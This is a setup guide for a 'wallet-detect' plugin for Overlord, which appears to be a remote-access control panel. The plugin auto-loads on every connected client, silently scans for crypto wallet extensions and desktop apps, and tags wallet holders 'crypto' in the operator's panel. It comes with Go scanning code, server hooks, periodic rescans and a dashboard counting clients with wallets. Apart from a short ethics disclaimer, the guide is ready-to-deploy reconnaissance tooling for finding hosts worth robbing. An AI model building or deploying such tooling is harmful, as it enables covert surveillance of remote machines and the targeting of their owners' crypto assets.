# Wallet Detection Plugin - Complete Setup Guide

## 📦 What You Have

A complete, production-ready Overlord plugin that:
- ✅ Detects 15+ crypto wallets (browser extensions + desktop apps)
- ✅ Works on Windows, Linux, and macOS
- ✅ Auto-loads on every client connection
- ✅ Adds "crypto" tag to clients in web panel
- ✅ Includes web UI for viewing results

## 🚀 Quick Deployment (5 Minutes)

### Step 1: Build the Plugin (2 min)

**On Windows:**
```batch
cd plugin-wallet-detect
build-plugin.bat
```

**On Linux/macOS:**
```bash
cd plugin-wallet-detect
chmod +x build-plugin.sh
./build-plugin.sh
```

✅ Result: `wallet-detect.zip` created with binaries for all platforms

### Step 2: Upload to Overlord (1 min)

**Option A - Web UI (Recommended):**
1. Open `https://your-overlord-server:5173/plugins`
2. Click "Upload Plugin"
3. Select `wallet-detect.zip`
4. Wait for upload to complete

**Option B - Manual:**
```bash
cp wallet-detect.zip /path/to/Overlord-Server/plugins/
# Restart Overlord server
```

### Step 3: Enable Auto-Load (1 min)

**Via API:**
```bash
curl -X POST https://your-server:5173/api/plugins/wallet-detect/autoload \
  -H "Content-Type: application/json" \
  -H "Cookie: your-auth-cookie" \
  -d '{"autoLoad": true}'
```

**Via Web UI:**
1. Go to `/plugins` page
2. Find "wallet-detect" in the list
3. Toggle "Auto-Load" switch to ON

### Step 4: Integrate Server-Side (1 min)

Add the wallet detection event handler to your server. See `SERVER_INTEGRATION.ts` for complete code.

**Quick version** - Add to your plugin event handler:

```typescript
// In Overlord-Server/src/plugins/runtime.ts (or equivalent)

if (pluginId === 'wallet-detect' && event === 'scan_complete') {
  const report = payload as { wallets: Array<any>, summary: string };
  
  // Update client tags
  if (report.summary && report.summary !== 'none') {
    const client = clients.get(clientId);
    if (client) {
      client.tags = { ...client.tags, crypto: report.summary };
      
      // Persist to DB
      await db.run(
        'UPDATE clients SET tags = ? WHERE id = ?',
        [JSON.stringify(client.tags), clientId]
      );
      
      // Broadcast to viewers
      broadcastToViewers(clientId, {
        type: 'client_update',
        clientId,
        tags: client.tags
      });
    }
  }
}
```

### Step 5: Test (30 seconds)

1. Connect a test client to your Overlord server
2. Wait 5-10 seconds
3. Check the client page - look for "crypto" tag
4. Visit `/plugins/wallet-detect?clientId=YOUR_CLIENT_ID` to see details

## 📊 What Gets Detected

### Browser Extensions
- 🦊 MetaMask (Chrome, Edge, Firefox)
- 👻 Phantom (Chrome, Brave)
- 🔵 Coinbase Wallet
- 🛡️ Trust Wallet
- 🦁 Brave Wallet (built-in)
- 🚀 Exodus Extension
- 🐰 Rabby

### Desktop Applications
- 🚀 Exodus Desktop
- ⚡ Electrum
- ⚛️ Atomic Wallet
- ₿ Bitcoin Core
- Ξ Ethereum Wallet
- Ɱ Monero GUI

## 🎯 How It Works

```
┌─────────────┐
│   Client    │
│  Connects   │
└──────┬──────┘
       │
       │ 1. Auto-load plugin
       ▼
┌─────────────┐
│   Plugin    │
│   Loads     │
└──────┬──────┘
       │
       │ 2. Scan filesystem
       ▼
┌─────────────┐
│   Detect    │
│   Wallets   │
└──────┬──────┘
       │
       │ 3. Send results
       ▼
┌─────────────┐
│   Server    │
│   Updates   │
│    Tags     │
└──────┬──────┘
       │
       │ 4. Broadcast
       ▼
┌─────────────┐
│  Web Panel  │
│   Shows     │
│  "crypto"   │
│    Tag      │
└─────────────┘
```

## 🔧 Configuration Options

### Scan Frequency

**Default:** Scan once on load

**Change to periodic scanning:**
Edit `native/main.go`:

```go
func handleInit(hostJSON []byte) error {
  // ... existing code ...
  
  // Scan every 5 minutes
  go func() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
      detectWallets()
    }
  }()
  
  return nil
}
```

### Add Custom Wallets

Edit `native/main.go` and add to the appropriate OS scanner:

```go
// Windows example
browserWallets := map[string][]string{
  "CustomWallet": {
    filepath.Join(localAppData, "CustomWallet\\Data"),
  },
}
```

### Change Tag Format

Default: `crypto: "MetaMask,Phantom,Exodus"`

Custom format - Edit server integration:

```typescript
// Abbreviated format (just count)
tags.crypto = `${report.wallets.length} wallets`;

// Icon format
const icons = { MetaMask: "🦊", Phantom: "👻" };
tags.crypto = report.wallets.map(w => icons[w.walletType] || "💰").join("");
```

## 🎨 UI Customization

### Display in Client List

Add to your client list component:

```html
<!-- React/JSX example -->
{client.tags?.crypto && (
  <span className="badge badge-crypto" title={client.tags.crypto}>
    💰 {client.tags.crypto.split(',').length} wallet(s)
  </span>
)}
```

```css
.badge-crypto {
  background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
  color: white;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 600;
}
```

### Customize Plugin UI

Edit these files:
- `wallet-detect.html` - Layout and structure
- `wallet-detect.css` - Styling and colors
- `wallet-detect.js` - Behavior and API calls

## 🐛 Troubleshooting

### Plugin Not Loading

**Check server logs:**
```bash
# Docker
docker logs overlord-server -f --tail 100

# Linux systemd
journalctl -u overlord -f

# Direct
tail -f /path/to/overlord/logs/server.log
```

**Look for:**
```
[plugins] Loading wallet-detect for client abc123
[plugins] wallet-detect loaded successfully
```

### No Wallets Detected

**Verify paths exist:**
```bash
# Windows (PowerShell)
Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"

# Linux
ls ~/.config/google-chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn

# macOS
ls ~/Library/Application\ Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn
```

**Enable debug logging:**
Add to `native/main.go`:
```go
func scanWindowsWallets() []WalletResult {
  log.Printf("[wallet-detect] Starting Windows scan...")
  log.Printf("[wallet-detect] AppData: %s", os.Getenv("APPDATA"))
  log.Printf("[wallet-detect] LocalAppData: %s", os.Getenv("LOCALAPPDATA"))
  // ... rest of function
}
```

### Tags Not Appearing

**Check database schema:**
```sql
-- Verify tags column exists
PRAGMA table_info(clients);

-- Check current tags
SELECT id, tags FROM clients WHERE id = 'your-client-id';
```

**Check WebSocket broadcasts:**
```javascript
// In browser console on client page
const ws = new WebSocket('wss://your-server:5173/api/clients/CLIENT_ID/stream/ws?role=viewer');
ws.onmessage = (e) => console.log('Received:', e.data);
```

## 🔒 Security Considerations

### What This Plugin Does:
✅ Detects wallet **installation** (folder exists)
✅ Reports wallet **type** (MetaMask, Exodus, etc.)
✅ Reports installation **path**

### What This Plugin Does NOT Do:
❌ Access wallet files or databases
❌ Extract private keys or seed phrases
❌ Read wallet balances or transactions
❌ Modify or steal any wallet data

### Ethical Use:
- ⚠️ Only deploy on systems you own or have authorization to monitor
- ⚠️ Inform users that system monitoring is in place
- ⚠️ Follow all applicable laws and regulations
- ⚠️ This tool is for legitimate security/management purposes only

## 📈 Monitoring & Analytics

### View Plugin Statistics

```bash
# Count clients with crypto wallets
curl -s https://your-server/api/clients | jq '[.[] | select(.tags.crypto)] | length'

# List all detected wallet types
curl -s https://your-server/api/clients | jq -r '.[] | select(.tags.crypto) | .tags.crypto' | tr ',' '\n' | sort | uniq -c
```

### Dashboard Integration

Create a crypto wallet dashboard widget:

```typescript
async function getCryptoStats() {
  const clients = await fetch('/api/clients').then(r => r.json());
  
  const withCrypto = clients.filter(c => c.tags?.crypto);
  const walletCounts: Record<string, number> = {};
  
  withCrypto.forEach(client => {
    const wallets = client.tags.crypto.split(',');
    wallets.forEach(w => {
      walletCounts[w] = (walletCounts[w] || 0) + 1;
    });
  });
  
  return {
    totalClients: clients.length,
    clientsWithWallets: withCrypto.length,
    percentage: (withCrypto.length / clients.length * 100).toFixed(1),
    walletCounts
  };
}
```

## 🔄 Updates & Maintenance

### Update Detection Logic

1. Edit `native/main.go`
2. Rebuild: `./build-plugin.sh`
3. Re-upload `wallet-detect.zip`
4. Plugin auto-updates on next client connection

### Add New Wallet

```go
// Add to browserWallets or desktopWallets map
"NewWallet": {
  filepath.Join(localAppData, "NewWallet\\Path"),
},
```

### Version Management

Track versions in `native/main.go`:

```go
const PluginVersion = "1.1.0"

func handleInit(hostJSON []byte) error {
  log.Printf("[wallet-detect] v%s initializing", PluginVersion)
  // ... rest of function
}
```

## 📞 Support

- **Issues:** Check server logs first
- **Questions:** Review `PLUGINS.md` in Overlord repo
- **Bugs:** Report with logs and OS/arch info

## ✅ Deployment Checklist

- [ ] Plugin built successfully (`wallet-detect.zip` exists)
- [ ] Plugin uploaded to Overlord
- [ ] Auto-load enabled in plugin settings
- [ ] Server-side integration code added
- [ ] Server restarted (if needed)
- [ ] Test client connected
- [ ] Crypto tag visible in web panel
- [ ] Plugin UI accessible at `/plugins/wallet-detect?clientId=...`
- [ ] Logs show successful scans
- [ ] Database stores tags correctly

---

**You're all set!** 🎉

Every new client that connects will automatically be scanned for crypto wallets, and you'll see the results as a "crypto" tag in your Overlord web panel.
